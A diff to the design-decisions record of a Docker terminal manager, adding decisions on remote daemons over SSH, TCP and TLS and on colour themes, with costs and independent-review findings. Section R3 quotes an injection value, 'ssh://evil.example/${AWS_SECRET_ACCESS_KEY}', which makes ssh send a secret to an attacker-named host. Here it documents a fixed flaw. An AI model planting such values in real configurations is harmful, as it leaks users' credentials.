@@ -6,6 +6,12 @@ also in `openspec/changes/docker-desk-workspace/design.md`); entries marked **B*
 during the build, usually because something real contradicted an assumption — the
 [journal](JOURNAL.md) tells those stories in order.
 
+Entries marked **R** (remote daemons) and **T** (themes) belong to the second change,
+`openspec/changes/remote-daemons-and-themes/`, and are collected in
+[their own section](#round-two--remote-daemons-and-themes). Where one of them overturns or
+relaxes a first-round decision, the older entry says so and is kept, because the reasoning it
+records is still the reasoning the newer one had to answer.
+
 Where a decision costs something, the cost is stated. Nothing here is presented as free.
 
 ---
@@ -45,6 +51,10 @@ O(visible rows) and must be able to say "nothing changed" cheaply (D8).
 Tea that cannot be turned off (B11).
 
 ### D5 — Unix sockets only; anything else is refused at launch
+
+> **Superseded by [R1](#r1--remote-daemons-are-accepted-visibility-replaces-refusal).** The
+> owner asked for remote daemons. The concern below is real and is now answered by announcing a
+> remote daemon as remote, not by refusing it.
 
 **Decided:** if the current context resolves to `tcp://`, `ssh://`, `npipe://` or anything
 that is not `unix://`, the program prints the endpoint, says why, and exits without opening
@@ -156,6 +166,11 @@ return *where the endpoint came from*, which the header, `--check`, the help ove
 launch errors all print.
 
 **Cost:** if Docker ever changes how contexts are stored, this must follow.
+
+**Since extended (R6):** the same package now also reads a context's TLS material and applies
+the CLI's TLS environment variables. The cost is correspondingly larger, and is checked: a test
+has the real `docker` CLI write a context with certificates and use it, and the desk must then
+reach the same daemon through it.
 
 ### D6 — A narrow `Engine` interface with the desk's own types; no `force` anywhere
 
@@ -608,6 +623,9 @@ the desk at it through `DOCKER_HOST`.
 no second way to choose. In the sandbox the header shows the sandbox socket like any other
 endpoint — the same mechanism you rely on to know your blast radius.
 
+**Since relaxed (R7):** `--host` and `--context` now exist. They are the Docker CLI's own two
+ways of naming a daemon, not a product-specific one, and the argument against `--demo` stands.
+
 ### B3 — Tests cannot open a read-write connection to a real daemon
 
 **Decided:** every test package that builds an engine calls `engine.InstallTestGuard()` from
@@ -616,6 +634,9 @@ the system temporary directory, and `DOCKER_HOST` points at a path that cannot e
 
 **Why:** "the tests only use the fake" was true by convention. This makes it true by
 construction: the two opt-in tests that visit a real daemon can only open it read-only.
+
+**Since extended (R9)** to TCP addresses and SSH tunnels, which would otherwise have been two
+ways around it.
 
 ### B11 — The pseudo-terminal harness answers the questions a real terminal answers
 
@@ -672,6 +693,508 @@ author's idea of how it could fail. For a tool that deletes things that is not e
 
 Each fix has a test that reproduces the reviewer's sequence, and for the three most serious
 the test was confirmed to fail when the fix is taken out.
+
+## Round two — remote daemons and themes
+
+The request: *"existing docker desk can only connect to local docker daemon. make it can
+connect to remote docker daemon through ssh or any other communication protocols. document all
+changes and decisions. additional task: applying theme."*
+
+Two readings were needed, and both are decisions:
+
+- *"ssh or any other communication protocols"* was read as: the protocols the Docker CLI itself
+  uses to reach a daemon on Linux and macOS — SSH, and TCP with or without TLS. Not an
+  invented protocol, and not Windows named pipes.
+- *"applying theme"* was read as: give the desk colour themes, selectable and switchable, and
+  apply one. Not a redesign of the layout.
+
+### R1 — Remote daemons are accepted; visibility replaces refusal
+
+**Decided:** an endpoint may be `ssh://` or `tcp://`. Nothing gates it: no flag, no extra
+confirmation. Instead, a daemon that is not this machine's own socket is *announced* — a tag
+next to the endpoint in the header (`[REMOTE ssh]`, `[REMOTE tls]`, `[REMOTE tls, UNVERIFIED]`,
+`[REMOTE tcp, NO TLS]`), never dropped, and repeated in the "daemon" line of every
+confirmation, form and picker, in the help, in `--check` and on the "terminal too small"
+screen.
+
+**Alternatives:**
+
+- *Keep refusing* (D5). Not what was asked.
+- *An opt-in flag on top of the context* (`--remote`). A context or `--host` is already an
+  explicit choice of daemon. A flag that must be given every time ends up in an alias and
+  protects nothing.
+- *A typed confirmation for every change on a remote daemon.* It would make restarting a
+  container on the server you are looking at as heavy as deleting a volume. D12 rejected
+  "type the object's name" because a control that is unbearable gets worked around; the same
+  applies.
+
+**Why:** the dialog is where the decision is made, and it is the one thing every rule of the
+desk already relies on being read (B25 exists to make sure it can be). Putting "this is
+another machine" there costs nothing on a local daemon and cannot be missed on a remote one.
+
+**Cost:** D5's protection was a refusal; this one is a sentence. A context left pointing at
+production will now open production. It will say so on the top line and in each dialog, and
+`--read-only` remains the stronger guard — but nothing stops the operator who does not read.
+This is the largest thing given up in this change, and it was given up on request.
+
+### R2 — SSH: one forwarded socket, not `docker system dial-stdio` per connection
+
+**Decided:** for `ssh://[user@]host[:port][/path]` the desk runs **one**
+`ssh -N -L <private local socket>:<remote socket>` and points its ordinary unix-socket client
+at the local end. The remote socket is `/var/run/docker.sock` unless the URL names another.
+
+**Alternative — the Docker CLI's way:** run `ssh host docker system dial-stdio` once per HTTP
+connection and speak HTTP over that process's stdin and stdout. It has one real advantage:
+"whatever works with `docker -H ssh://…` works here", including servers that forbid
+forwarding.
+
+**Why not:** the desk is not a command. With twelve running containers it holds an event
+stream, a log stream, twelve statistics streams and a few request connections, and opens one
+more for a shell; the cap from D19 is 32 statistics streams. Per-connection ssh means an ssh
+process, a key exchange and an authentication for each of them — and `sshd`'s defaults drop
+connections beyond ten being set up at once (`MaxStartups 10:30:100`), while the usual cure,
+connection sharing, is capped at ten sessions per connection (`MaxSessions 10`). The CLI gets
+away with it because a command opens one or two connections. The desk would start flaky and
+stay slow: every confirmation reads four lists first (B14), each a fresh login.
+
+Forwarded socket connections are *channels*, not sessions, and are not counted against either
+limit. Measured against a real `sshd`: one tunnel, one login, 40 concurrent statistics streams
+plus the event stream, a mutation and an interactive shell (`TestRealSSH`).
+
+A second consequence, in the operator's favour: the remote machine does not need the `docker`
+CLI. And one that made R4 possible: the tunnel is a process started *before* the desk takes
+the terminal.
+
+**Cost — three things the CLI's way does not ask for:**
+
+- *The SSH server must allow forwarding to unix sockets.* It does by default. Found by trying
+  against a real `sshd`: it is refused not only by `AllowStreamLocalForwarding no` and
+  `DisableForwarding yes` but also by `AllowTcpForwarding no` and `PermitOpen none`. On such a
+  server `docker -H ssh://…` works and the desk does not; the launch message names the
+  settings (R8). A fallback to the CLI's way was considered and left out: two transports to
+  keep correct for the sake of servers hardened against exactly this.
+- *The socket's path must be known.* The remote user's Docker context and `DOCKER_HOST` are not
+  consulted. A rootless daemon is `ssh://user@host/run/user/1000/docker.sock` — the Docker
+  CLI's own syntax for naming the socket — and the launch message says so when the default
+  path has nothing behind it.
+- *OpenSSH 6.7 or newer* (2014) on both sides.
+
+### R3 — The system's `ssh`, not an SSH library
+
+**Decided:** the tunnel is the operator's `ssh` program. `DOCKER_DESK_SSH` names another
+program, or leading arguments (`ssh -F $HOME/.ssh/work_config`).
+
+**Alternative:** `golang.org/x/crypto/ssh` inside the binary — no run-time dependency, and the
+same channels.
+
+**Why:** the operator has already told `ssh` how to reach their machines and what to trust:
+`~/.ssh/config` (aliases, `ProxyJump`, per-host identities), the agent, `known_hosts`,
+certificates, hardware keys. A library would have to re-implement each of those, and a private
+re-implementation of host-key checking is the last thing to want in a tool that deletes things
+on servers. The Docker CLI made the same choice for the same reason.
+
+**What is taken from the URL is not trusted** — a context file is not always the operator's
+own writing. Each part that reaches ssh's command line is held to a short list of characters:
+letters, digits, and `. _ : -` in a host, `. _ @ + -` in a user, `. _ / @ + , = -` in a socket
+path; a port is digits. A password, a query, a fragment and control characters are refused
+outright, and the destination is passed after `--`. This is much narrower than what ssh
+accepts, and deliberately so.
+
+The first version refused only what I knew to be dangerous: a leading `-`, and `:` and `\` in
+the path. The review (R13) found what I did not know: **ssh expands `${VAR}` and `%`-tokens in
+the paths of a forwarding**. A context whose host was `ssh://evil.example/${AWS_SECRET_ACCESS_KEY}`
+— or the same percent-encoded, so that it did not look like one — made ssh send that
+variable's value to the server it named. A list of what is known to be safe does not depend on
+knowing every such feature. A user name or path that needs other characters belongs in
+`~/.ssh/config` under a host alias, where the operator wrote it.
+
+**Cost:** "needs nothing else at run time" now has an exception — `ssh://` endpoints need an
+OpenSSH client. Unix and TCP endpoints still need nothing.
+
+### R4 — ssh asks its questions before the desk opens, and never after
+
+**Decided:** the tunnel is opened while the terminal is still the operator's ordinary screen.
+If ssh needs a passphrase, a password or a decision about an unknown host key, it asks — itself,
+on the terminal — and the desk opens when the tunnel is up. Once the desk owns the terminal,
+ssh is only ever run with `BatchMode=yes`: a reconnection that would need an answer fails
+instead of asking. The same when the program is not started from a terminal (`--check` in a
+script). What ssh says on stderr is shown until the tunnel is up and kept, not shown,
+afterwards.
+
+**Why:** a prompt written underneath a full-screen program is invisible, and a key typed for
+the desk would be read as part of a passphrase. The CLI's per-connection way cannot offer an
+interactive login to a full-screen program at all; this is the other half of why R2 went the
+way it did.
+
+**`BatchMode` is not enough, and the first version relied on it.** Found by the review, which
+reproduced it end to end: when the host is reached through a jump host (`ProxyJump`), ssh
+starts a second ssh for the jump — and does not pass `BatchMode` on to it. After a dropped
+link that second ssh asked for its passphrase on the terminal the desk was drawn on, and the
+`q` typed next went to the prompt instead of the desk. So a run that must not ask is now also
+started **without a controlling terminal** (in a session of its own): neither it nor anything
+it starts — a jump host's ssh, a `ProxyCommand` — has a terminal to ask on. And with
+`SSH_ASKPASS_REQUIRE=never`, so that it does not put up a graphical prompt instead.
+`TestJumpHostNeverAsksUnderTheDesk` is the review's scenario; it fails with the detached
+session taken out.
+
+**Cost:** a login that needs a typed answer cannot be repeated after the link drops. The desk
+stays open and says so — `The ssh link to … is down — retrying: … Permission denied` — and has
+to be restarted to log in again. An agent removes the limit. Handing the terminal back to ssh
+from inside the desk, the way the shell is handed it (D16), would remove it for everyone and
+was left as an open question rather than built unasked.
+
+### R5 — The tunnel belongs to the desk: its own connection, supervised, private, cleaned up
+
+**Decided, each for a failure it prevents:**
+
+- `ControlMaster=no`, `ControlPath=none` — the tunnel never joins a connection the operator
+  shares between sessions. A forwarding added to that would stay behind after the desk quits.
+- `ServerAliveInterval=10`, `ServerAliveCountMax=3` — a dead link is noticed in about half a
+  minute, ssh exits, and a supervisor starts it again: pause of 1 s growing to 15 s, each
+  attempt bounded to 30 s, until the desk quits.
+- A fresh `0700` directory, and `StreamLocalBindMask=0177` for a `0600` socket — whoever can
+  connect to the local socket controls the remote daemon, with the remote user's rights.
+- `StreamLocalBindUnlink=yes` and the same path on every restart — the client keeps dialling
+  one address. (Found by trying: ssh leaves its socket file behind when it is terminated.)
+- On quit, on a failed launch, on Ctrl+C during launch, and on a hang-up at any time — the
+  terminal window being closed, which is an ordinary way to leave — ssh is ended and the
+  directory removed. (The hang-up was added after the review found the socket left behind.)
+- `ForkAfterAuthentication=no` — an ssh that the operator's configuration sends to the
+  background after logging in looked, to the desk, like one that had exited without a word;
+  the launch failed and the ssh that had gone to the background stayed, tunnel and all (found
+  by the review). The option is newer than everything else on the command line (OpenSSH 8.7):
+  a client that rejects it is run again without it, and an ssh that exits with status 0 before
+  the tunnel is up is reported as having gone to the background, not as an unexplained exit.
+- On Linux, ssh is also ended if the desk dies without the chance to clean up (`kill -9`): the
+  kernel's "parent death" signal. It is tied to the *thread* that started the child, so ssh is
+  started, and waited for, on a thread that lives exactly as long as it does.
+
+**Deliberately not set:** `ExitOnForwardFailure`. It would make ssh exit when *any* forwarding
+fails — including one from the operator's own `~/.ssh/config` whose port is busy because they
+have a session open to that host. The desk's forwarding binds a path nobody else has; if ssh
+reports that it could not, the launch fails at once with ssh's words.
+
+**Cost:** on macOS a desk killed outright leaves its ssh running until the link drops; its
+socket is private. After `kill -9` or `SIGQUIT`, on any system, the empty directory and the
+dead socket stay in the temporary directory: nothing sweeps them.
+
+### R6 — TCP and TLS follow the Docker CLI's rules; plain TCP is allowed, and labelled
+
+**Decided:** TLS is used exactly when the CLI would use it, with the same material:
+
+| Endpoint named by | TLS when | Verified | Material |
+| --- | --- | --- | --- |
+| `--host`, `DOCKER_HOST` | `DOCKER_TLS_VERIFY` or `DOCKER_TLS` is non-empty | only with `DOCKER_TLS_VERIFY` | `ca.pem`, and `cert.pem`+`key.pem` if both exist, in `DOCKER_CERT_PATH` or the config directory |
+| a named context | it stores TLS files, or sets `SkipTLSVerify` | unless `SkipTLSVerify` | `contexts/tls/<id>/docker/` — the environment is ignored |
+
+Verifying without a `ca.pem` is an error at launch, as in the CLI, rather than a silent
+fall-back to the system's authorities. TLS files are read once, at launch, so that a bad
+certificate is a launch error naming the file.
+
+**Three rules I had wrong, found by the review and each confirmed by running the `docker` CLI
+against a closed port:**
+
+- *A port not given means 2375 — with TLS too.* I had assumed the conventional 2376 for TLS.
+  The CLI does not guess, and a desk that dials another port than `docker` is looking at a
+  different daemon. The port in use is now shown by `--check` and in the help.
+- *The "default" context is not "the local socket".* It is `DOCKER_HOST` when that is set — so
+  `--context default` does not get past `DOCKER_HOST` — and, when `DOCKER_TLS_VERIFY` or
+  `DOCKER_TLS` is set and no host is named anywhere, `tcp://localhost:2376`. That last rule is
+  odd; it is still where `docker` goes.
+- *A context that stores any TLS file is a TLS context.* With only half a client key pair in
+  the store I returned "no TLS" — plain TCP where TLS was asked for, the worst possible
+  reading. The CLI uses TLS without a client certificate; so does the desk.
+
+Plain TCP connects. It is labelled `tcp, NO TLS`, and unverified TLS `tls, UNVERIFIED`, in the
+colour of danger, everywhere the daemon is named.
+
+**Alternative:** refuse plain TCP, or require a flag for it. Rejected as in R1: the CLI allows
+it, it is how daemons are reached across a VPN or a relay, and the desk's job is to make the
+operator aware, not to decide for them.
+
+**Cost:** an unencrypted, unauthenticated daemon is one variable away. It says so in capitals.
+
+### R7 — `--host` and `--context`, with the CLI's precedence
+
+**Decided:** `-H`/`--host URL` and `-c`/`--context NAME`. Precedence is the CLI's: `--context`,
+`--host`, `DOCKER_HOST`, `DOCKER_CONTEXT`, the configured context, the default socket; both
+flags together are refused. A host named by flag takes its TLS from the environment, like
+`DOCKER_HOST`. The header, `--check` and the help say which of them chose the daemon.
+
+**Why:** reaching a remote daemon should not require exporting a variable into the shell —
+where it then silently applies to every `docker` command typed afterwards. A flag is scoped to
+the one program it is given to.
+
+**Not added:** `--tlsverify`, `--tlscacert` and the rest. The variables and the context store
+cover it, and six more flags to keep in step with the CLI's is six more places to diverge.
+
+### R8 — A remote failure is explained for what it is
+
+**Decided:** each transport's failures are named, before the workspace opens.
+
+- **TCP.** The port is dialled once before the client library is used. *Found:* the library
+  reports every failure to connect with one sentence ("Cannot connect to the Docker daemon…")
+  and hides the cause from `errors.Is`, so a refused port, a name that does not resolve and a
+  firewall that drops packets all read alike. The direct dial is skipped when the environment
+  routes the address through a proxy, since a direct connection proves nothing about that path.
+- **TLS.** TLS towards a port that does not speak it; a port that expects TLS with none
+  configured; a certificate from another authority; a certificate not valid for the name; a
+  client certificate missing, or refused.
+- **SSH, before the tunnel is up.** ssh's own last lines, without its notices, and a hint for
+  the two common cases (cannot log in; host key unknown or changed).
+- **SSH, tunnel up but the socket unreachable.** *Found:* the ssh client reports every such
+  failure with the same words — `open failed: connect failed: open failed` — whether the
+  socket is missing, forbidden, or the server refuses to forward. So the remote machine is
+  asked, over a second, non-interactive connection, with a one-line `sh -c 'test …'`: no socket
+  there, not a socket, or not permitted. If the socket is there and may be opened, two causes
+  remain that cannot be told apart from either end — nothing is listening on it, or the server
+  forbids forwarding — and the message names both. If the question cannot be asked at all (the
+  login needed a typed answer, or the server runs no commands), every possibility is listed.
+
+- **SSH, tunnel up, no answer in time.** Said as exactly that. *Found by the review:* a daemon
+  that accepted the connection and then said nothing was handed to the probe above and came
+  back as "the SSH server could not connect to it" — with a hint about `sshd_config`. The
+  server had connected. Silence is not a refusal.
+- **A socket in a directory the remote user may not enter** (another user's rootless daemon)
+  is "you may not look inside that directory", not "there is no socket — is Docker running?"
+  *(review)*.
+- **A local socket that ssh could not create** says "Permission denied" as well, and got the
+  hint for a failed login *(review)*. Hints are matched most specific first.
+- **A certificate file that cannot be used** is the client's own set-up failing; it is no
+  longer reported under "the daemon is not reachable" *(review)*.
+- **TLS hints say where TLS came from.** For a named context they no longer suggest changing
+  environment variables the context ignores *(review)*.
+- **Messages name the daemon, not the tunnel.** The client library quotes the address it
+  dialled, which for SSH is a socket in a temporary directory; the list pane read "failed to
+  connect to the docker API at unix:///tmp/docker-desk-ssh-…" *(review)*. Error text is
+  rewritten to the endpoint the operator knows. The hint for trying ssh by hand repeats the
+  command that was actually run, `DOCKER_DESK_SSH` included.
+
+**Why not always list every possibility:** "is Docker running, or are you not in the group, or
+is forwarding forbidden" sends the operator to three places. One true sentence sends them to
+one. But a guess presented as a finding is worse than a list, hence the two fall-backs.
+
+**Cost:** one more connection on the failure path of an SSH launch, and a few string matches on
+error text from the TLS library, which a future Go version could reword (the tests would say).
+
+### R9 — The test guard covers the new ways in
+
+**Decided:** under the guard (B3) a read-write engine may be opened only on a unix socket
+under the temporary directory, or on a TCP address that the fake engine itself is listening on
+(it registers the address when it opens the listener — a TCP address has no directory to tell
+a fake by). An SSH tunnel may be opened only to a remote socket under the temporary directory.
+The switch moved into its own package, `internal/testguard`, because two layers now obey it.
+
+**Why the tunnel needs its own check:** the tunnel's local end is *always* a socket under the
+temporary directory. Without a check on the far end, tunnelling would have been a way to make
+the engine's guard say yes to a real daemon.
+
+### R10 — What counts as proof, for transports
+
+**Decided:** the same layering as D22, with real protocol implementations wherever one exists
+on the machine, and the fake daemon always at the far end:
+
+- the client library over plain TCP and over mutual TLS, including the hijacked exec, which it
+  dials by a different code path;
+- the tunnel's supervisor against a stand-in for ssh — the test binary itself, taking ssh's
+  command line and failing the ways ssh fails — so that every path runs everywhere;
+- the same tunnel with the **real ssh client and a real `sshd`**: the suite starts an
+  unprivileged `sshd` on a loopback port with throwaway keys (`internal/sshtest`), and skips
+  those tests where OpenSSH's server is not installed;
+- the launch sequence in process, for every transport and every failure;
+- the **real `docker` CLI** writing a context with certificates and using it, before the desk
+  is asked to (the check on D4/R6);
+- the real binary on a pseudo-terminal over TCP, TLS and SSH — a passphrase typed before the
+  desk opens, the link dropping and coming back, Ctrl+C while ssh connects, the desk killed.
+
+**Alternative for SSH:** only the stand-in. Much less machinery — and it would have encoded my
+understanding of OpenSSH, which was wrong in four places (see the journal, §14).
+
+**Cost, stated plainly:** all of it runs on one machine. No packet left it; no daemon on
+another computer was ever contacted; password logins were not exercised (an unprivileged
+`sshd` cannot check passwords — a key with a passphrase stands in for "ssh has a question").
+See [TESTING.md](TESTING.md).
+
+### R11 — Nothing that identifies the daemon is ever cut off
+
+**Found** by the first end-to-end run over SSH. The endpoint named its socket and was long;
+the dialog's "daemon" line was a single line fitted to the dialog's width — and what fell off
+the right-hand end was the context and the `[ssh]` tag. The header had the same shape of
+fault: when nothing else could be dropped, the whole line was truncated at the right, where
+the connection state and the tags are.
+
+**Decided:** in a dialog the endpoint, the context and the tag each go beside what is already
+there when they fit and onto a line of their own when they do not, and one that is longer than
+a line is continued on the next. In the header, when nothing else is left to drop — the
+engine's name and version, the title, "— retrying" — it is the *middle* of the endpoint that
+gives way: its beginning says which machine and its end which socket.
+
+**Corrected after the review**, which found the first fix incomplete in three ways: a long
+*context name* still pushed the tag off the dialog line (`[REMOTE tls, U…`); the header cut
+the endpoint's *end*, so that two rootless daemons on one host (`…/1000/docker.sock`,
+`…/1001/docker.sock`) looked the same; and the tests only checked a short endpoint in the
+connected state. The tests now use the review's own examples, connected and disconnected.
+
+**Why it matters more than a cosmetic fault:** R1 rests entirely on that tag being read.
+
+### R12 — "Remote" is decided by the address
+
+**Decided:** `localhost` and loopback addresses are not called remote — the tag then names
+only the transport (`[ssh]`, `[tcp, NO TLS]`). Every other address is.
+
+**Cost:** a name that merely resolves to this machine is called remote. The tag errs towards
+caution, and the header also shows the engine's own host name.
+
+### R13 — An independent review of the new ways in
+
+**Decided:** as in round one (B30), before calling it done the new code — resolution, the
+tunnel, TLS, the launch sequence, and what the desk shows about the daemon — was handed to a
+separate reviewer with ten rules it must obey and no account of why I believed it did. It was
+asked for concrete inputs and sequences that break a rule, and it ran them: against the fake
+daemon, a throwaway sshd, and the `docker` CLI pointed at listeners of its own. It did not
+touch the repository or the real daemon.
+
+**Why:** the same reason as before, and sharper. The tests I had written proved that what I
+had thought of worked. The two most serious findings are things I did not know about OpenSSH;
+no test of mine could have contained them.
+
+**What came back, and what was done:**
+
+| Finding | Outcome |
+| --- | --- |
+| The ssh started for a **jump host** asks for its passphrase underneath the running desk after a reconnect, and reads the operator's keys | fixed — R4: a non-interactive ssh has no controlling terminal |
+| ssh **expands `${VAR}` and `%`-tokens** in the socket path from a URL or context: environment variables are sent to the server named there, and the path shown is not the path used | fixed — R3: a list of permitted characters for every part of the destination, and for the local path |
+| Confirmations **do not fit 80×24**; the prompt and the input can be off screen | fixed — R14 |
+| The daemon's identity is **cut off at 80 columns**: the endpoint's end in the header, the tag behind a long context name in a dialog | fixed — R11 |
+| Over TLS, **opening a shell can hang for ever**: the library dials that connection without a context | fixed: the attach is bounded by its context in the engine layer, and the TLS transport has a handshake timeout |
+| **`--context default` ignores `DOCKER_HOST`**; the CLI does not. Without a host, the TLS variables mean `tcp://localhost:2376` | fixed — R6 |
+| **Explanations that blame the wrong cause** (five of them) | fixed — R8 |
+| With **`ForkAfterAuthentication`**, the launch fails and an authenticated tunnel is left running | fixed — R5 |
+| The socket and its directory are **left behind after a hang-up** | fixed for the hang-up — R5; `kill -9` and `SIGQUIT` kept, as a stated cost |
+| **Error text names the tunnel's local socket** as the daemon | fixed — R8 |
+| A context storing **half a key pair is opened without TLS** | fixed — R6 |
+| The **default port differs from the CLI's** when TLS is on, and is shown nowhere | fixed — R6 |
+| **Control characters** from a percent-encoded URL are written to the terminal | fixed: refused when the endpoint is resolved, and by the character lists of R3 |
+| **Shell metacharacters in a host** are accepted (a current ssh refuses them itself; an older one with `ProxyCommand %h` would not) | fixed — R3 |
+| **Tests that cannot fail**: the Ctrl+C test passes without the code it tests; a leftover check only logs; a broken sshd helper turns every real-SSH test into a skip; a launch that forgets its endpoint would find the operator's real context | fixed: the stand-in ignores the terminal's interrupt; the check asserts, in a temporary directory of its own; `DOCKER_DESK_REQUIRE_SSHD=1` turns those skips into failures; the pseudo-terminal harness starts every program with an endpoint that cannot exist and no Docker configuration; the guard's idea of "the temporary directory" is fixed when the tests start |
+| Minor: a stale "open failed" line reported as why the link fell; `T` replacing the "dropped the pending action" notice; a relative `./.docker` when `HOME` is unset | fixed |
+| Loopback addresses are not called remote even when they are a port-forward to another machine | kept (R12): the address is all there is to go by; the header also shows the engine's own host name |
+| Through a proxy, the shell's connection goes direct | kept, and stated in the README: it is the client library's behaviour, and the Docker CLI's |
+
+Each fix has a test that replays the reviewer's input or sequence. For four of them — the two
+most serious among them — the test was run with the fix taken out and seen to fail
+([TESTING.md](TESTING.md#do-these-tests-have-teeth)).
+
+It also recorded what it examined and could not break: option injection through the host,
+user and port; the socket's permissions; the supervisor's states (no deadlock or leak apart
+from the one above); that only the first ssh may ask; the TLS rules, including that a CA is
+never ignored and that the name in a certificate is checked; the precedence apart from the one
+above; that `T` cannot confirm anything; the in-process guard; that every launch failure exits
+before the alternate screen.
+
+And what it did not examine: the palettes and their contrast; macOS; OpenSSH versions other
+than 9.6; password logins; the README and this file.
+
+### R14 — A confirmation always fits the terminal
+
+**Found** by the review: at 80×24 some confirmations were taller than the screen. The key
+hints — and for "prune images, all unused" the prompt and the input line themselves — were
+drawn below the last row. One dialog did this before round two; the extra "daemon" lines of a
+long remote endpoint pushed two more over.
+
+**Decided:** a confirmation has three parts. What is acted on and on which daemon, at the top,
+and how to proceed — the refusal, or the prompt, the input and the keys — at the bottom, are
+never scrolled and never cut. What lies between — the effects, the warnings and, for a set, the
+exact objects — takes the room that is left. Usually that is everything but a long list, which
+scrolls on its own as before. When even that does not fit, the whole middle scrolls as one, and
+says so ("lines 4–9 of 31 · … scroll — read all of it").
+
+**Alternative:** refuse to confirm when the dialog does not fit, in the spirit of B27 (nothing
+is acted on that is not on screen). Simpler — and it would have made the largest prunes
+impossible at the minimum size the desk claims to support.
+
+**Why this and not that:** B27 is about acting on what cannot be *seen*. Here everything can
+be — by scrolling, with the input in view the whole time. What must never happen is typing a
+confirmation into a line that is off screen, and that is now impossible by construction; a
+test opens every kind of confirmation at 80×24, on a local and on a long remote endpoint,
+types into it, and scrolls to every listed object.
+
+**Cost:** on a small terminal the effects and warnings of a long confirmation are not all
+visible at once. And this changes a round-one dialog, which is more than was asked for; it was
+done because the review showed the input line off screen.
+
+### T1 — A theme is a palette of meanings, and can change nothing else
+
+**Decided:** a theme is seven colours — accent, dim, good, warn, bad, unfocused border,
+unfocused title — and an optional pair for the highlighted row. One function builds every
+style from them. Weight, underline and reverse video are the same in every theme; layout,
+glyphs and wording are out of a theme's reach.
+
+**Alternatives:**
+
+- *Per-element styling* (a colour for every pane, column and state). More to choose from, and a
+  theme that could make "refused" look like "succeeded".
+- *Theme files.* The first round listed themes and configuration files as non-goals; themes
+  were now asked for, files were not. A palette that can be edited freely is also one where red
+  need not mean danger, and the desk has no configuration file to put one in.
+
+**Why:** the desk's colours carry meaning — red is "this deletes" and "this failed". Fixing
+*what the colours mean* and letting a theme choose only *which colours* keeps that true in
+every theme. `TestAThemeChangesColourAndNothingElse` draws every kind, in two layouts, plus a
+refused deletion, in every theme and compares the text cell for cell.
+
+### T2 — The default look does not change
+
+**Decided:** `dark` is the original palette, value for value, pinned by a test. With no theme
+setting the desk uses `dark`, or `light` when the terminal reports a light background.
+
+**Why `light` at all, by default:** it is the one case where the original palette was wrong —
+light grey titles on white. Everywhere else, nobody who did not ask for a theme sees a
+difference.
+
+### T3 — `--theme`, `DOCKER_DESK_THEME`, and `T`; nothing is saved
+
+**Decided:** a flag, a variable, and a key that switches to the next theme in the running
+desk. The status line then names the theme and both ways of keeping it. An unknown name is an
+error that lists the known ones.
+
+**Alternatives:** *remember the last theme* — needs a configuration file, the desk's first; not
+worth it for one setting, and left as an open question. *Fall back to the default on an unknown
+name* — a typo would then look like "themes do not work".
+
+**Why a key as well:** nobody chooses a palette from its name. `T` is upper-case like the
+other keys that are not everyday navigation, and it is not an action: it is handled after
+dialogs and the filter have had the key, sends nothing, and — like any key — drops a
+confirmation that is still being prepared (B26), keeping that notice on the status line rather
+than replacing it with the theme's name.
+
+### T4 — Themes are checked for contrast, and never paint the background
+
+**Decided:** the desk does not set a background colour. A named palette is meant for a
+terminal already using that scheme, and each of its text colours is tested at ≥ 3:1 against
+that scheme's background; the highlighted row's text at ≥ 4.5:1 against the highlight.
+
+**Changed because of the test:** Dracula's comment colour (3.0:1) is too faint for hints that
+are read all the time — a lighter tone of the same hue is used; Solarized's green and yellow on
+its light background (2.97:1) were darkened; unfocused borders in four palettes were raised
+from 1.6–1.8:1 to above 2:1; Solarized's own selection background differed from the page by
+1.15:1 and was replaced by a stronger tone from the same palette. So three of the palettes are
+not the canonical ones to the last digit. Legibility won.
+
+**Why not paint the background:** a desk that repaints the whole terminal fights transparency,
+background images and the terminal's own theme, and every unpainted cell (padding, an overlay's
+edge) shows as a hole.
+
+### T5 — No colour still means no colour
+
+**Decided:** `NO_COLOR`, or a terminal without colour, wins over any theme: no colour sequence
+is emitted and every theme draws the same frame. `mono` is the same by choice. `T` then says
+so, rather than appear to do nothing.
+
+**Found while testing this:** without colour the renderer emits no attributes at all — not
+bold, not reverse video. I had written that reverse video is what keeps the highlighted row
+visible without colour; it is not. The `▸` glyph is, exactly as the first round designed
+("selection adds a cursor glyph"). The comment was corrected and the test asserts the glyph.
 
 ## Process
 
